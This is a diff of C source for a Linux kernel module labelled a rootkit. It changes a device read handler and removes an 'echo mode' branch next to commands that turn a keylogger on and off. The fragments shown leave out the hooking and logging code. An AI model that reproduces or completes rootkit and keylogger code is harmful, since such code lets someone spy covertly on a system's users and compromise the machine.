@@ -3,11 +3,6 @@
 // 2019-10-24
 // Linux Kernel Module Rootkit
 
-//#include <include/stdio.h>
-//#include <include/unistd.h>
-//#include <sys/stat.h>
-//#include <sys/types.h>
-
 #include <linux/module.h>	/* Needed by all modules */
 #include <linux/kallsyms.h> /* for kallsyms_lookup_name */
 #include <linux/init.h>
@@ -147,14 +142,12 @@ static int dev_open (struct inode *inode, struct file *f)
 static ssize_t dev_read (struct file *f, char *buf, size_t len, loff_t *off)
 {
   static char  message[] = "Hello, this is a message from the kernel\n";
-  //char * ptr = keys_buf;
   int error_count = 0;
 
-	printk ("Device read. Want Length: %lu, have length: %lu\n",len,sizeof(message));
+	printk ("Device read. Len: %lu\n",len);
 
-   // copy_to_user has the format ( * to, *from, size) and returns 0 on success
-    error_count = copy_to_user(buf, message, len);
-   //error_count = memcpy(buf, keys_buf, len);
+   // copy_to_user has the format ( * to, *from, size) and returns 0 on
+   error_count = copy_to_user(buf, message, sizeof(message));
 
    if (error_count==0){
       printk(KERN_INFO "User read %lu characters\n", len);
@@ -217,12 +210,6 @@ else if(compareBufs(buf, "exitkeylogger", len-1))
 		printk("Keylogger: deactivated\n");
 		exit_keylogger();
 	}
-  else if(memcmp(buf, "e", 1) == 0)
-  {
-    printk("echo mode\n");
-    //int* p = buflen;
-    //printk(buf);
-  }
 	return len;
 }
 
